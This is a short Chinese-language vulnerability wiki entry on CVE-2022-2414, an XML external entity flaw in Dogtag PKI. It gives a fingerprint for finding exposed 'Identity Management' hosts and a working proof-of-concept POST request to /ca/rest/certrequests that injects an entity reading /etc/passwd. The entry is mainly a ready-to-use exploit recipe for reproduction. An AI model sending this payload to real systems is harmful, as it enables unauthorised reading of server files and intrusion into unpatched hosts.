# Dogtag PKI XML实体注入漏洞 CVE-2022-2414

## 漏洞描述

Dogtag PKI 的XML解析器存在安全漏洞，该漏洞源于在分析 XML 文档时访问外部实体可能会导致 XML 外部实体 （XXE） 攻击。此漏洞允许远程攻击者通过发送特制的 HTTP 请求来潜在地检索任意文件的内容。

## 漏洞影响

<a-checkbox checked>Dogtag PKI</a-checkbox></br>

## 网络测绘

<a-checkbox checked>title="Identity Management" </a-checkbox></br>

## 漏洞复现

登录页面

![img](/assets/PeiQi-Wiki/img/1666109777446-b643ca9b-dea3-4ac4-8bf0-8f34f1eec640.png)

验证POC

```java
POST /ca/rest/certrequests
Content-Type: application/xml

<!--?xml version="1.0" ?-->
<!DOCTYPE replace [<!ENTITY ent SYSTEM "file:///etc/passwd"> ]>
<CertEnrollmentRequest>
  <Attributes/>
  <ProfileID>&ent;</ProfileID>
</CertEnrollmentRequest>
```

![img](/assets/PeiQi-Wiki/img/1666110160561-329b89b1-2d6a-47a7-b026-45b0b7ef6670.png)